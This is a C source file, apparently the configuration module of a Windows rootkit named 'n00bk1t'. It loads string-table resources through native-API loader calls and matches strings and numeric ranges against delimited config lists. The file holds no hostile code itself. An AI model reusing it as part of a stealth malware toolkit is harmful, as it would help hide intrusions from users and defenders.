// standard includes 
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>

// own includes
#include "ntdll.h"
#include "resource.h"
#include "config.h"

// our base address
extern HMODULE n00bk1tBaseAddress;

PWCHAR config_LoadStringTable(HMODULE hModule,DWORD dwStringID)
{
	PWCHAR						lpStringTable;
	PIMAGE_RESOURCE_DATA_ENTRY	piResDataEntry;
	LDR_RESOURCE_INFO			ldrResInfo;

	ldrResInfo.Name=(ULONG)MAKEINTRESOURCEW((dwStringID/16)+1); // stringtable
	ldrResInfo.Type=(ULONG)MAKEINTRESOURCEW(6); // stringtable
	ldrResInfo.Language=(ULONG)MAKEINTRESOURCEW(0); // 0
	
	// find stringtable
	if (!NT_SUCCESS(LdrFindResource_U(hModule,&ldrResInfo,3,&piResDataEntry)))
		return NULL;

	// load stringtable in memory
	if (!NT_SUCCESS(LdrAccessResource(hModule,piResDataEntry,&lpStringTable,NULL)))
		return NULL;

	return lpStringTable;
}

PWCHAR config_GetResourceStringData(HMODULE hModule,DWORD dwStringID)
{
	DWORD	dwCount;
	PWCHAR	lpString;
	
	// load string table in memory
	lpString=config_LoadStringTable(hModule,dwStringID);
	if (!lpString)
		return NULL;
	
	// find correct string resource
	for (dwCount=0;dwCount<dwStringID%16;dwCount++)
	{
		lpString+=1+(*lpString);
	}

	return lpString;
}

BOOL config_GetAnsiString(HMODULE hModule,DWORD dwStringID,PANSI_STRING pasString)
{
	PWCHAR pwString;
	UNICODE_STRING usString;
		
	// get pointer to string in stringtable
	if (pwString=config_GetResourceStringData(hModule,dwStringID))
	{
		// convert it to ansi
		usString.Buffer=pwString+1;
		usString.Length=usString.MaximumLength=(*pwString)*2;

		if (NT_SUCCESS(RtlUnicodeStringToAnsiString(pasString,&usString,TRUE)))
			return TRUE;
	}

	return FALSE;
}

INT config_GetInt(HMODULE hModule,DWORD dwStringID)
{
	PWCHAR pwString;
	UNICODE_STRING usString;
	ANSI_STRING asString;
	INT iRet=0;
		
	// get pointer to string in stringtable
	if (pwString=config_GetResourceStringData(hModule,dwStringID))
	{
		// convert it to ansi
		usString.Buffer=pwString+1;
		usString.Length=usString.MaximumLength=(*pwString)*2;

		if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&asString,&usString,TRUE)))
		{
			sscanf(asString.Buffer,"%i",&iRet);
			RtlFreeAnsiString(&asString);
		}
			
	}

	return iRet;
}

BOOL config_CheckString(INT iItem,LPSTR lpString,DWORD dwLen)
{
	ANSI_STRING asString;
	LPSTR lpBegin,lpEnd;

	// get our config string
	if (!config_GetAnsiString(n00bk1tBaseAddress,iItem,&asString))
		return FALSE;

	// get begin and end of string
	lpBegin=asString.Buffer;
	lpEnd=strchr(asString.Buffer,CONFIG_DELIMITER);
	
	// check all strings in string
	while(lpBegin&&*lpBegin)
	{
		// null terminated
		if (!lpEnd)
		{
			if (strlen(lpBegin)&&_strnicmp(lpString,lpBegin,strlen(lpBegin))==0)
			{
				RtlFreeAnsiString(&asString);
				return TRUE;
			}
		
			RtlFreeAnsiString(&asString);
			return FALSE;
		}
		// delimited
		else
		{
			if (lpEnd-lpBegin>0)
			{
				if (_strnicmp(lpString,lpBegin,lpEnd-lpBegin)==0)
				{	
					RtlFreeAnsiString(&asString);
					return TRUE;
				}
			}
			else
			{
				RtlFreeAnsiString(&asString);
				return FALSE;
			}
		}
		
		lpBegin=lpEnd+1;
		lpEnd=strchr(lpBegin,CONFIG_DELIMITER);
	}

	RtlFreeAnsiString(&asString);

	return FALSE;
}

BOOL config_CheckInt(INT iItem,UINT uiInt)
{
	ANSI_STRING asString;
	LPSTR lpBegin,lpEnd;
	UINT uiOne,uiTwo;

	// get our config string
	if (!config_GetAnsiString(n00bk1tBaseAddress,iItem,&asString))
		return FALSE;

	// get begin and end of string
	lpBegin=asString.Buffer;
	lpEnd=strchr(asString.Buffer,CONFIG_DELIMITER);
	
	// check all strings in string
	while(lpBegin&&*lpBegin)
	{
		// check for range
		if (sscanf(lpBegin,"%u-%u",&uiOne,&uiTwo)==2)
		{
			if (uiInt>=uiOne&&uiInt<=uiTwo)
			{
				RtlFreeAnsiString(&asString);
				return TRUE;
			}
		}
		// check for number
		else if (sscanf(lpBegin,"%u",&uiOne)==1)
		{
			if (uiOne==uiInt)
			{
				RtlFreeAnsiString(&asString);
				return TRUE;
			}
		}
		// not last number
		if (lpEnd)
		{
			lpBegin=lpEnd+1;
			lpEnd=strchr(lpBegin,CONFIG_DELIMITER);
		}
		// last number
		else 
			break;
	}

	RtlFreeAnsiString(&asString);

	return FALSE;
}

BOOL config_GetOneStringW(DWORD dwStringID,DWORD dwItem,PUNICODE_STRING usString)
{
	PWCHAR pwString;
	PWCHAR pwLoop;
	PWCHAR pwItem;
	DWORD  dwHit=0;

	if (!usString)
		return FALSE;

	// get our config string
	pwString=config_GetResourceStringData(n00bk1tBaseAddress,dwStringID);
	if (!pwString)
		return FALSE;

	pwLoop=pwString+1;
	pwItem=pwLoop;

	while(1)
	{
		if ((pwLoop-pwString)==(*pwString+1))
		{
			if (dwHit==dwItem)
			{
				usString->Buffer=pwItem;
				usString->Length=(pwLoop-pwItem)*2;
				usString->MaximumLength=usString->Length;

				return TRUE;
			}

			return FALSE;
		}

		if (*(CHAR*)pwLoop==CONFIG_DELIMITER)
		{
			if (dwHit==dwItem)
			{
				usString->Buffer=pwItem;
				usString->Length=(pwLoop-pwItem)*2;
				usString->MaximumLength=usString->Length;

				return TRUE;
			}
		
			pwItem=pwLoop+1;
			dwHit++;
		}
	
		pwLoop++;
	}

	return FALSE;
}

BOOL config_GetOneStringA(DWORD dwStringID,DWORD dwItem,PANSI_STRING asString)
{
	UNICODE_STRING usString;

	if (config_GetOneStringW(dwStringID,dwItem,&usString))
	{
		if (NT_SUCCESS(RtlUnicodeStringToAnsiString(asString,&usString,TRUE)))
			return TRUE;
	}

	return FALSE;
}


	
	
